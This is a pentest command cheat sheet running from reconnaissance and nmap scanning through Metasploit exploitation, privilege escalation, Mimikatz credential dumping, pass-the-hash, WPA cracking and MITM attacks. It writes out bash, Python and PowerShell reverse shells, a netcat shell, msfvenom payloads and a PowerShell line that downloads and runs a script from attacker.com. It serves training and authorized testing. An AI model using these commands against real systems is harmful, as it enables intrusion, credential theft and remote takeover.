# Ethical Hacking — Commands and Techniques Reference

IMPORTANT: All techniques here are for authorized penetration testing, CTF competitions, security research, and learning on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.

## Phases of a Penetration Test

1. Reconnaissance — gather information without touching the target.
2. Scanning & Enumeration — discover open ports, services, versions, users.
3. Vulnerability Analysis — identify weaknesses.
4. Exploitation — attempt to compromise the target.
5. Post-Exploitation — what can an attacker do after gaining access?
6. Reporting — document findings, severity, remediation.

## Reconnaissance — Passive (No Direct Contact)

WHOIS — domain registration info:
```bash
whois example.com
whois 192.168.1.1
```

DNS lookups:
```bash
nslookup example.com
nslookup -type=MX example.com          # mail servers
nslookup -type=NS example.com          # name servers
nslookup -type=TXT example.com         # TXT records (SPF, DKIM)
dig example.com                         # detailed DNS query
dig example.com ANY                     # all record types
dig example.com MX                      # mail records
dig example.com AXFR @ns1.example.com  # zone transfer attempt (often blocked)
dig +short example.com                  # just the IP
host example.com                        # simple lookup
```

Reverse DNS:
```bash
dig -x 8.8.8.8                         # reverse lookup of IP
nslookup 8.8.8.8
```

Subdomain enumeration:
```bash
# Sublist3r
sublist3r -d example.com
sublist3r -d example.com -o subs.txt

# Amass
amass enum -d example.com
amass enum -passive -d example.com
amass enum -brute -d example.com -w /usr/share/wordlists/subdomains.txt

# Subfinder
subfinder -d example.com
subfinder -d example.com -o subs.txt

# Assetfinder
assetfinder --subs-only example.com

# DNSrecon
dnsrecon -d example.com
dnsrecon -d example.com -t std         # standard
dnsrecon -d example.com -t brt -D wordlist.txt  # brute force
```

Email and user enumeration (OSINT):
```bash
theHarvester -d example.com -b all     # emails, subdomains, hosts, employees
theHarvester -d example.com -b google,linkedin,shodan
```

Google Dorks (search engine reconnaissance):
```
site:example.com                        # all indexed pages
site:example.com filetype:pdf           # find PDF files
site:example.com inurl:admin            # admin pages
site:example.com intitle:"index of"     # directory listings
site:example.com ext:sql OR ext:bak     # database/backup files
inurl:wp-admin site:example.com         # WordPress admin
"@example.com" filetype:xls            # email lists in spreadsheets
```

Shodan (internet-connected device search — shodan.io):
```bash
# CLI: pip install shodan; shodan init YOUR_API_KEY
shodan search "apache 2.4 hostname:example.com"
shodan host 192.168.1.1
shodan count "default password"
# Search filters: country:US, city:"New York", port:22, os:"Windows", product:nginx
```

## Reconnaissance — Active (Direct Contact)

Ping sweep — find live hosts:
```bash
ping -c 1 192.168.1.1                  # single ping
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP"; done

# fping — faster
fping -a -g 192.168.1.0/24 2>/dev/null
fping -a -g 192.168.1.1 192.168.1.254

# nmap ping scan (no port scan)
nmap -sn 192.168.1.0/24
```

Traceroute — network path:
```bash
traceroute example.com
traceroute -T -p 80 example.com        # TCP traceroute on port 80
mtr example.com                         # continuous traceroute
```

## Nmap — Network Scanning

The most important tool in a pentester's arsenal.

```bash
# Basic scans
nmap 192.168.1.1                        # default scan (top 1000 ports)
nmap 192.168.1.0/24                     # scan entire subnet
nmap 192.168.1.1-254                    # range
nmap -iL targets.txt                    # scan from file

# Port selection
nmap -p 80 192.168.1.1                  # specific port
nmap -p 80,443,8080 192.168.1.1         # multiple ports
nmap -p 1-1000 192.168.1.1             # range
nmap -p- 192.168.1.1                    # ALL 65535 ports (slow)
nmap --top-ports 100 192.168.1.1        # top 100 most common ports

# Scan types
nmap -sS 192.168.1.1                    # SYN scan (stealth, requires root)
nmap -sT 192.168.1.1                    # TCP connect scan (no root needed)
nmap -sU 192.168.1.1                    # UDP scan (slow)
nmap -sN 192.168.1.1                    # Null scan (FIN=0, SYN=0, ACK=0)
nmap -sF 192.168.1.1                    # FIN scan
nmap -sX 192.168.1.1                    # Xmas scan (FIN+URG+PSH)
nmap -sA 192.168.1.1                    # ACK scan (firewall mapping)
nmap -sW 192.168.1.1                    # Window scan
nmap -sO 192.168.1.1                    # IP protocol scan

# Service and version detection
nmap -sV 192.168.1.1                    # detect service versions
nmap -sV --version-intensity 9 192.168.1.1  # aggressive version detection
nmap -O 192.168.1.1                     # OS detection (requires root)
nmap -A 192.168.1.1                     # aggressive (-sV -O -sC --traceroute)

# Scripts (NSE — Nmap Scripting Engine)
nmap -sC 192.168.1.1                    # default scripts
nmap --script=banner 192.168.1.1        # grab banners
nmap --script=http-title 192.168.1.1    # get HTTP page titles
nmap --script=vuln 192.168.1.1          # check for common vulnerabilities
nmap --script=ftp-anon 192.168.1.1      # check anonymous FTP login
nmap --script=smb-vuln-ms17-010 192.168.1.1  # EternalBlue check
nmap --script=ssh-brute 192.168.1.1     # SSH brute force
nmap --script=http-sql-injection 192.168.1.1 # basic SQLi check
nmap --script=ssl-heartbleed 192.168.1.1     # Heartbleed check
nmap --script=auth 192.168.1.1          # authentication tests
nmap --script="not intrusive" 192.168.1.1   # safe scripts only

# Speed and timing
nmap -T0 192.168.1.1                    # paranoid (very slow, IDS evasion)
nmap -T1 192.168.1.1                    # sneaky
nmap -T2 192.168.1.1                    # polite
nmap -T3 192.168.1.1                    # normal (default)
nmap -T4 192.168.1.1                    # aggressive (faster)
nmap -T5 192.168.1.1                    # insane (fastest, may miss results)

# Evasion
nmap -f 192.168.1.1                     # fragment packets
nmap -D RND:10 192.168.1.1             # decoy scan (10 random decoys)
nmap -D 10.0.0.1,10.0.0.2 192.168.1.1 # specific decoys
nmap --source-port 53 192.168.1.1      # spoof source port
nmap -sS --randomize-hosts 192.168.1.0/24  # randomize target order
nmap --spoof-mac 0 192.168.1.1         # random MAC address
nmap --data-length 25 192.168.1.1      # pad packets

# Output
nmap -oN output.txt 192.168.1.1         # normal output to file
nmap -oX output.xml 192.168.1.1         # XML output
nmap -oG output.gnmap 192.168.1.1       # grepable output
nmap -oA output 192.168.1.1             # all formats at once

# Common combinations
nmap -sS -sV -O -p- --min-rate 5000 192.168.1.1           # full fast scan
nmap -sV -sC -p 21,22,80,443,8080 --open 192.168.1.0/24   # common ports with scripts
nmap -A -T4 -p- 192.168.1.1 -oA full_scan                  # aggressive full scan
```

## Service Enumeration

### FTP (port 21)
```bash
ftp 192.168.1.1                         # connect (try anonymous / anonymous)
nmap --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vuln* -p 21 192.168.1.1
# Anonymous login: username = anonymous, password = anything
```

### SSH (port 22)
```bash
ssh user@192.168.1.1
ssh -p 2222 user@192.168.1.1            # custom port
ssh -i id_rsa user@192.168.1.1          # with private key
# Enumerate algorithms
nmap --script=ssh2-enum-algos -p 22 192.168.1.1
ssh-audit 192.168.1.1                   # audit SSH config
```

### SMTP (port 25/465/587)
```bash
nc 192.168.1.1 25
EHLO test
VRFY admin                              # check if user exists
EXPN admin                              # expand mailing list
nmap --script=smtp-enum-users,smtp-open-relay -p 25 192.168.1.1
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.1
```

### DNS (port 53)
```bash
dig axfr example.com @192.168.1.1       # zone transfer
dnsrecon -d example.com -n 192.168.1.1
fierce --domain example.com             # DNS brute force
```

### HTTP/HTTPS (port 80/443)
```bash
curl -I http://192.168.1.1              # headers only
curl -v http://192.168.1.1             # verbose with headers
curl -X OPTIONS http://192.168.1.1     # what HTTP methods are allowed
wget http://192.168.1.1/               # download page
whatweb http://192.168.1.1             # identify technologies
```

### SMB (port 445/139)
```bash
smbclient -L //192.168.1.1             # list shares (anonymous)
smbclient -L //192.168.1.1 -U user     # with credentials
smbclient //192.168.1.1/share          # connect to share
enum4linux -a 192.168.1.1              # full SMB enumeration
enum4linux-ng -A 192.168.1.1           # improved version
crackmapexec smb 192.168.1.1           # quick SMB info
crackmapexec smb 192.168.1.0/24        # scan subnet
crackmapexec smb 192.168.1.1 -u user -p pass --shares  # authenticated enum
nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.1.1
```

### LDAP (port 389)
```bash
ldapsearch -h 192.168.1.1 -x -b "dc=example,dc=com"  # anonymous
ldapsearch -h 192.168.1.1 -x -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com"
nmap --script=ldap-rootdse,ldap-search -p 389 192.168.1.1
```

### SNMP (port 161 UDP)
```bash
snmpwalk -v2c -c public 192.168.1.1    # walk with community string "public"
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1.1.0   # system info
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1
nmap -sU -p 161 --script=snmp-info 192.168.1.0/24
```

### RDP (port 3389)
```bash
nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 192.168.1.1
rdesktop 192.168.1.1                    # RDP client
xfreerdp /u:user /p:pass /v:192.168.1.1  # xfreerdp client
```

### MySQL (port 3306)
```bash
mysql -h 192.168.1.1 -u root -p        # connect
nmap --script=mysql-info,mysql-empty-password,mysql-enum -p 3306 192.168.1.1
```

## Web Application Testing

### Directory and File Discovery
```bash
# Gobuster (fast, Go-based)
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://192.168.1.1 -w wordlist.txt -x php,html,txt,bak
gobuster dir -u http://192.168.1.1 -w wordlist.txt -t 50          # 50 threads
gobuster dir -u http://192.168.1.1 -w wordlist.txt -b 301,302     # ignore redirects
gobuster dns -d example.com -w subdomains.txt                      # subdomain brute

# Feroxbuster (recursive, Rust-based)
feroxbuster -u http://192.168.1.1 -w wordlist.txt
feroxbuster -u http://192.168.1.1 -w wordlist.txt -x php,html -d 3  # recursive depth 3
feroxbuster -u http://192.168.1.1 --filter-status 301,302,404

# Dirb
dirb http://192.168.1.1
dirb http://192.168.1.1 /usr/share/wordlists/dirb/big.txt

# Dirsearch
dirsearch -u http://192.168.1.1 -e php,html,js,txt
dirsearch -u http://192.168.1.1 -w wordlist.txt -t 30

# ffuf (Fuzz Faster U Fool — also for parameter fuzzing)
ffuf -u http://192.168.1.1/FUZZ -w wordlist.txt
ffuf -u http://192.168.1.1/FUZZ -w wordlist.txt -fc 404            # filter 404s
ffuf -u http://192.168.1.1/FUZZ -w wordlist.txt -mc 200,301        # match only these
ffuf -u "http://192.168.1.1/?FUZZ=test" -w params.txt              # parameter fuzzing
ffuf -u http://192.168.1.1 -H "Host: FUZZ.example.com" -w subdomains.txt  # vhost fuzzing
```

### Web Vulnerability Scanners
```bash
# Nikto
nikto -h http://192.168.1.1            # basic scan
nikto -h http://192.168.1.1 -p 8080   # custom port
nikto -h http://192.168.1.1 -ssl      # HTTPS
nikto -h http://192.168.1.1 -o report.html -Format htm

# Nuclei (template-based, very fast)
nuclei -u http://192.168.1.1
nuclei -u http://192.168.1.1 -t cves/          # only CVE templates
nuclei -u http://192.168.1.1 -t vulnerabilities/
nuclei -l targets.txt -t technologies/          # identify tech stack
nuclei -u http://192.168.1.1 -severity critical,high
nuclei -u http://192.168.1.1 -tags sqli,xss

# WPScan (WordPress)
wpscan --url http://192.168.1.1
wpscan --url http://192.168.1.1 --enumerate u   # users
wpscan --url http://192.168.1.1 --enumerate p   # plugins
wpscan --url http://192.168.1.1 --enumerate t   # themes
wpscan --url http://192.168.1.1 -P passwords.txt -U admin  # password attack

# CMSmap
cmsmap http://192.168.1.1             # detect and test CMS
```

### SQL Injection
```bash
# SQLmap — automated SQL injection
sqlmap -u "http://192.168.1.1/page?id=1"           # basic GET request
sqlmap -u "http://192.168.1.1/page?id=1" --dbs      # enumerate databases
sqlmap -u "http://192.168.1.1/page?id=1" -D mydb --tables
sqlmap -u "http://192.168.1.1/page?id=1" -D mydb -T users --dump
sqlmap -u "http://192.168.1.1/login" --data="user=admin&pass=test"  # POST
sqlmap -u "http://192.168.1.1/page?id=1" --cookie="session=abc123"  # with cookie
sqlmap -u "http://192.168.1.1/page?id=1" --level=5 --risk=3          # aggressive
sqlmap -u "http://192.168.1.1/page?id=1" --os-shell                  # try shell
sqlmap -r request.txt                                                  # from Burp request
sqlmap -u "http://192.168.1.1/page?id=1" --technique=BEUSTQ           # all techniques
sqlmap -u "http://192.168.1.1/page?id=1" --batch --random-agent       # non-interactive
```

### XSS and Parameter Testing
```bash
# dalfox — XSS scanner
dalfox url "http://192.168.1.1/search?q=test"
dalfox file urls.txt                   # from file
dalfox url "http://192.168.1.1/" --silence  # quiet mode

# XSStrike
python3 xsstrike.py -u "http://192.168.1.1/search?q=test"
python3 xsstrike.py -u "http://192.168.1.1/search?q=test" --crawl

# Manual XSS payloads to test in input fields:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# "><script>alert(1)</script>
# javascript:alert(1)
# <svg/onload=alert(1)>
```

### Burp Suite Workflow
```bash
# Launch (GUI tool — set browser proxy to 127.0.0.1:8080)
burpsuite &
# Key features:
# Proxy: intercept and modify HTTP requests
# Repeater: manually repeat and modify requests
# Intruder: automated fuzzing/brute force
# Scanner: automated vulnerability scanning (Pro)
# Decoder: encode/decode data (base64, URL, hex)
# Comparer: diff two requests/responses

# Send request to Repeater: Ctrl+R
# Send to Intruder: Ctrl+I
# Use Intruder attack types:
# Sniper: one payload set, one position at a time
# Battering ram: same payload in all positions
# Pitchfork: multiple payload sets, one each per position
# Cluster bomb: all combinations of payload sets
```

## Password Attacks

### Online Brute Force
```bash
# Hydra — network login brute forcer
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
hydra -L users.txt -P passwords.txt 192.168.1.1 ftp
hydra -l admin -P rockyou.txt http-post-form "http://192.168.1.1/login:user=^USER^&pass=^PASS^:Login failed"
hydra -l admin -P rockyou.txt 192.168.1.1 smb
hydra -l admin -P rockyou.txt 192.168.1.1 rdp
hydra -l user -P rockyou.txt 192.168.1.1 mysql
hydra -t 4 -l admin -P rockyou.txt 192.168.1.1 ssh    # 4 threads
hydra -t 16 -I -u -L users.txt -P passwords.txt -M targets.txt ssh  # multi-target

# Medusa
medusa -h 192.168.1.1 -u admin -P rockyou.txt -M ssh
medusa -H hosts.txt -U users.txt -P passwords.txt -M http

# CrackMapExec (SMB, WinRM, SSH, MSSQL, LDAP)
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
crackmapexec ssh 192.168.1.0/24 -u admin -P rockyou.txt
crackmapexec winrm 192.168.1.1 -u admin -p 'Password123'  # Windows Remote Management
```

### Offline Hash Cracking
```bash
# Hashcat — GPU-accelerated hash cracking
hashcat -m 0    hash.txt rockyou.txt              # MD5
hashcat -m 100  hash.txt rockyou.txt              # SHA-1
hashcat -m 1400 hash.txt rockyou.txt              # SHA-256
hashcat -m 1800 hash.txt rockyou.txt              # sha512crypt (Linux /etc/shadow)
hashcat -m 3200 hash.txt rockyou.txt              # bcrypt
hashcat -m 1000 hash.txt rockyou.txt              # NTLM (Windows)
hashcat -m 5600 hash.txt rockyou.txt              # NetNTLMv2
hashcat -m 13100 hash.txt rockyou.txt             # Kerberoasting (TGS-REP)
hashcat -m 18200 hash.txt rockyou.txt             # AS-REP Roasting

# Attack modes
hashcat -m 0 -a 0 hash.txt wordlist.txt            # dictionary attack
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt  # combinator
hashcat -m 0 -a 3 hash.txt "?l?l?l?l"             # brute force (4 lowercase)
hashcat -m 0 -a 6 hash.txt wordlist.txt "?d?d?d"   # hybrid: word + 3 digits
hashcat -m 0 -a 0 -r rules/best64.rule hash.txt wordlist.txt  # with rules
hashcat -m 0 --show hash.txt                       # show cracked
hashcat -m 0 -a 0 --username hash.txt wordlist.txt  # with usernames in hash file

# Hashcat charsets: ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all ?b=byte

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=rockyou.txt --rules hashes.txt     # with mangling rules
john hashes.txt                                     # auto-detect hash type
john --format=NT hashes.txt                         # specify format (NTLM)
john --format=bcrypt hashes.txt
john --show hashes.txt                              # show cracked

# Extract hashes from files
pdf2john encrypted.pdf > hash.txt
zip2john protected.zip > hash.txt
rar2john protected.rar > hash.txt
ssh2john id_rsa > hash.txt
keepass2john database.kdbx > hash.txt
# Then: john hash.txt --wordlist=rockyou.txt

# Identify hash type
hash-identifier
hashid '$2y$10$abc...'                  # identify bcrypt
# Online: https://hashes.com/en/decrypt/hash
```

## Network Attacks and MITM

```bash
# ARP poisoning / Man-in-the-Middle
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1    # poison victim
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100    # poison gateway (run both)
echo 1 > /proc/sys/net/ipv4/ip_forward            # enable forwarding

# Bettercap — MITM framework
bettercap -iface eth0
# In bettercap console:
# net.probe on          — discover hosts
# net.show              — list discovered hosts
# arp.spoof.targets 192.168.1.100
# arp.spoof on          — start poisoning
# net.sniff on          — capture traffic
# http.proxy on         — intercept HTTP

# Ettercap
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//

# Responder — capture NTLM hashes on Windows networks
responder -I eth0 -rdwv           # listen on interface
# Captures NTLMv2 hashes when victims try to resolve fake hosts
# Crack captured hashes with hashcat -m 5600

# Wireshark / tshark — packet capture
tcpdump -i eth0 -w capture.pcap               # capture all traffic
tcpdump -i eth0 port 80 -w http.pcap          # capture HTTP
tcpdump -i eth0 'host 192.168.1.1'            # filter by host
tcpdump -i eth0 -A                             # ASCII output (readable)
tshark -i eth0 -f "port 80" -w http.pcap      # tshark equivalent
tshark -r capture.pcap -T fields -e http.request.uri  # extract URLs
```

## Exploitation — Metasploit Framework

```bash
# Launch
msfconsole
msfconsole -q                          # quiet mode (no banner)

# Inside msfconsole:
search eternalblue                     # search for exploit
search type:exploit platform:windows   # filter search
use exploit/windows/smb/ms17_010_eternalblue
info                                   # show module details
show options                           # show required/optional options
set RHOSTS 192.168.1.1
set LHOST 192.168.1.99
set LPORT 4444
show payloads                          # compatible payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check                                  # check if target is vulnerable
run                                    # or: exploit

# Common exploits
use exploit/multi/handler              # generic listener
use exploit/windows/smb/ms17_010_eternalblue   # EternalBlue (WannaCry)
use exploit/unix/ftp/vsftpd_234_backdoor       # vsftpd backdoor
use exploit/multi/http/struts2_content_type_ognl  # Apache Struts
use exploit/linux/http/gitlab_file_read_rce    # GitLab RCE
use auxiliary/scanner/smb/smb_ms17_010        # scan for EternalBlue

# Meterpreter commands (after successful exploit)
sysinfo                                # system info
getuid                                 # current user
getsystem                              # try to elevate to SYSTEM
getpid                                 # current PID
ps                                     # list processes
migrate 1234                           # migrate to PID 1234
shell                                  # drop to system shell
background                             # background session (Ctrl+Z)
sessions -l                            # list sessions
sessions -i 1                          # interact with session 1

# File operations
upload /path/local /path/remote
download /path/remote /path/local
ls / dir
cat /etc/passwd
search -f *.txt                        # search for files

# Privilege escalation (post-exploitation)
use post/multi/recon/local_exploit_suggester  # suggest privesc exploits
run post/windows/gather/hashdump       # dump Windows hashes
use post/linux/gather/hashdump         # dump Linux hashes
run post/windows/manage/enable_rdp    # enable RDP

# Persistence
use exploit/windows/local/persistence
use post/linux/manage/cron_persistence

# Pivoting
route add 10.0.0.0/8 1                 # route through session 1
use auxiliary/server/socks_proxy       # SOCKS proxy through session

# Generate payloads with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.99 LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.99 LPORT=4444 -f elf -o payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.99 LPORT=4444 -f raw -o shell.php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.99 LPORT=4444 -f powershell
msfvenom -l payloads                   # list all payloads
msfvenom -l formats                    # list output formats
msfvenom -p windows/meterpreter/reverse_tcp --list-options  # options for payload
```

## Privilege Escalation

### Linux Privilege Escalation
```bash
# Basic info gathering
id                                     # current user and groups
whoami
hostname
uname -a                               # kernel version (exploit?)
cat /etc/os-release                    # OS version
cat /etc/passwd                        # list users
cat /etc/shadow                        # password hashes (if readable)
cat /etc/sudoers                       # sudo config
sudo -l                                # what can current user run as sudo?
env                                    # environment variables (check PATH)
echo $PATH

# SUID binaries (run as owner's privilege regardless of who executes)
find / -perm -u=s -type f 2>/dev/null  # find all SUID files
find / -perm -g=s -type f 2>/dev/null  # find SGID files
# Check GTFOBins (gtfobins.github.io) for exploitation of SUID binaries

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l                             # current user's crontab
cat /var/spool/cron/crontabs/*        # all crontabs
# Look for: writable scripts run by cron, writable directories in PATH

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find / -writable -type d 2>/dev/null

# Network connections
netstat -tulpn                         # listening ports
ss -tulpn                              # same (newer)
cat /proc/net/tcp                      # raw TCP connections
arp -a                                 # ARP cache

# Processes
ps aux                                 # all processes
ps aux | grep root                     # processes run by root
cat /proc/[pid]/cmdline                # command line of process

# Password hunting
find / -name "*.conf" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.log" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name ".bash_history" 2>/dev/null | xargs cat
grep -r "password" /var/www/html/ 2>/dev/null

# Kernel exploits
uname -a                               # get kernel version
searchsploit linux kernel 4.4          # search for exploits
# Common: DirtyCow (2.6.22–3.9), PwnKit (polkit), Baron Samedit (sudo), Dirty Pipe

# Automated tools
# LinPEAS (most comprehensive)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# LinEnum
bash LinEnum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

### Windows Privilege Escalation
```bash
# Info gathering (run in cmd or PowerShell)
whoami
whoami /priv                           # privileges
whoami /groups                         # group memberships
net user                               # list local users
net localgroup administrators          # members of Administrators
net user username                      # details about a user
systeminfo                             # full system info
hostname
ipconfig /all
netstat -ano                           # connections with PIDs
tasklist                               # running processes
tasklist /svc                          # processes with services

# Scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr "Task Name\|Run As User\|Task To Run"

# Installed software
wmic product get name,version

# Password hunting
findstr /si password *.txt *.xml *.ini *.config 2>nul
dir /s /b *pass* *cred* *secret* 2>nul
type %APPDATA%\..\..\..\..\unattend.xml
type C:\Windows\Panther\Unattend.xml
reg query HKCU\Software\SimonTatham\PuTTY\Sessions  # PuTTY saved passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon

# Automated tools
# WinPEAS
winpeas.exe
# PowerUp
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1'); Invoke-AllChecks"
# Seatbelt (post-exploitation checklist)
Seatbelt.exe -group=all

# AlwaysInstallElevated (install MSI as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1, create: msfvenom -p windows/x64/shell_reverse_tcp LHOST=... -f msi -o evil.msi
# Then: msiexec /quiet /qn /i evil.msi

# Token impersonation (if SeImpersonatePrivilege)
# JuicyPotato, RoguePotato, PrintSpoofer, GodPotato
PrintSpoofer64.exe -i -c cmd           # pop SYSTEM shell
GodPotato -cmd "cmd /c whoami"
```

## Post-Exploitation and Lateral Movement

```bash
# Dump credentials
# Mimikatz (Windows)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords          # dump plaintext passwords + hashes from LSASS
sekurlsa::wdigest                 # WDigest (plaintext on older systems)
lsadump::sam                      # dump SAM database
lsadump::lsa /patch               # dump LSA secrets
lsadump::dcsync /user:Administrator  # DCSync — dump domain hashes
kerberos::list                    # list Kerberos tickets
kerberos::golden /user:admin /domain:corp.local /sid:S-1-... /krbtgt:HASH /ptt  # golden ticket

# From meterpreter
run post/windows/gather/hashdump
load kiwi; creds_all              # mimikatz in meterpreter

# Pass the Hash (authenticate with NTLM hash, no plaintext needed)
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH' --local-auth
impacket-psexec Administrator@192.168.1.1 -hashes :NTLM_HASH
impacket-wmiexec Administrator@192.168.1.1 -hashes :NTLM_HASH
pth-winexe -U 'Administrator%HASH' //192.168.1.1 cmd

# Kerberoasting (get TGS tickets for service accounts, crack offline)
impacket-GetUserSPNs corp.local/user:pass -dc-ip 192.168.1.1 -request
# Then crack with: hashcat -m 13100

# AS-REP Roasting (users without pre-auth required)
impacket-GetNPUsers corp.local/ -dc-ip 192.168.1.1 -no-pass -usersfile users.txt
# Crack with: hashcat -m 18200

# Impacket tools (Python-based Windows/AD tools)
impacket-psexec user:pass@192.168.1.1         # get shell via SMB
impacket-wmiexec user:pass@192.168.1.1        # shell via WMI
impacket-smbexec user:pass@192.168.1.1        # shell via SMB (creates service)
impacket-secretsdump user:pass@192.168.1.1    # dump all credentials
impacket-smbclient user:pass@192.168.1.1      # SMB client
impacket-rpcdump 192.168.1.1                  # enumerate RPC endpoints
impacket-lookupsid corp.local/user:pass@192.168.1.1  # enumerate domain SIDs

# Pivoting / Tunneling
# SSH tunnel (forward port 3306 on remote through SSH to local 13306)
ssh -L 13306:192.168.1.100:3306 user@jumphost
# Dynamic SOCKS proxy
ssh -D 1080 user@jumphost                      # SOCKS5 on localhost:1080
# Then configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT 192.168.2.0/24           # scan inner network through proxy

# Chisel (fast reverse tunneling)
# On attacker: chisel server -p 8080 --reverse
# On victim:   chisel client attacker:8080 R:1080:socks
```

## Wireless Network Testing

```bash
# Requirements: wireless adapter with monitor mode support (e.g., Alfa AWUS036NHA)

# Set to monitor mode
airmon-ng start wlan0              # creates wlan0mon
ip link set wlan0 down
iwconfig wlan0 mode monitor
ip link set wlan0 up

# Scan for networks
airodump-ng wlan0mon

# Capture handshake for a specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth client to force reconnect (capture handshake)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# Then: crack capture-01.cap

# Crack WPA2 handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
hashcat -m 22000 capture-01.cap rockyou.txt   # faster GPU cracking (hcxdumptool format)

# PMKID attack (no handshake needed)
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hash pmkid.pcapng
hashcat -m 22000 pmkid.hash rockyou.txt

# WPS attacks
wash -i wlan0mon                   # find WPS-enabled networks
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv   # WPS PIN bruteforce
bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3   # alternative WPS attack

# Evil twin / fake AP
hostapd-wpe hostapd.conf          # fake AP with credential capture
```

## CTF Tools and Misc

```bash
# Steganography
steghide extract -sf image.jpg      # extract hidden data from image
steghide info image.jpg             # check for hidden data
binwalk -e file.png                  # extract embedded files
stegsolve                            # GUI for LSB and color plane analysis
exiftool image.jpg                   # read metadata
strings file.bin                     # print printable strings
file unknown_file                    # identify file type
xxd file | head                      # hex dump

# Cryptography
echo "aGVsbG8=" | base64 -d          # base64 decode
echo "hello" | base64                # base64 encode
echo "68656c6c6f" | xxd -r -p        # hex to ASCII
python3 -c "print(bytes.fromhex('68656c6c6f').decode())"
echo "hello" | md5sum                # compute MD5
echo "hello" | sha256sum             # compute SHA256
openssl enc -d -aes-256-cbc -in enc.bin -out dec.txt -pass pass:mypassword

# Reverse engineering
strings binary                       # find readable strings
ltrace ./binary                      # trace library calls
strace ./binary                      # trace system calls
objdump -d binary                    # disassemble
file binary                          # identify type (ELF, PE, etc.)
readelf -a binary                    # ELF information
nm binary                            # list symbols
gdb binary                           # GNU debugger
gdb -batch -ex "run" -ex "bt" binary # get backtrace on crash

# Network forensics
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port -e http.request.uri
tshark -r capture.pcap -Y 'http.request' -T fields -e http.request.method -e http.host -e http.request.uri
foremost -i capture.pcap             # carve files from pcap
networkx                             # graph analysis of network data

# Port forwarding / reverse shells
# Simple netcat listener (attacker)
nc -lvnp 4444
# Reverse shell from victim (bash)
bash -c 'bash -i >& /dev/tcp/192.168.1.99/4444 0>&1'
# Python reverse shell
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.99",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
# PowerShell reverse shell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('192.168.1.99',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$r=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($r,0,$r.Length)}"

# Upgrade simple shell to fully interactive PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z, stty raw -echo; fg, reset

# Useful one-liners
nc -e /bin/bash 192.168.1.99 4444   # netcat bind shell (if -e supported)
curl ifconfig.me                     # get your public IP
curl http://192.168.1.1/robots.txt  # check robots.txt
wget -q -O - http://192.168.1.1     # fetch page silently
```

## Important Wordlists

```bash
# SecLists (most comprehensive — apt install seclists or github.com/danielmiessler/SecLists)
/usr/share/seclists/Discovery/Web-Content/common.txt          # common directories
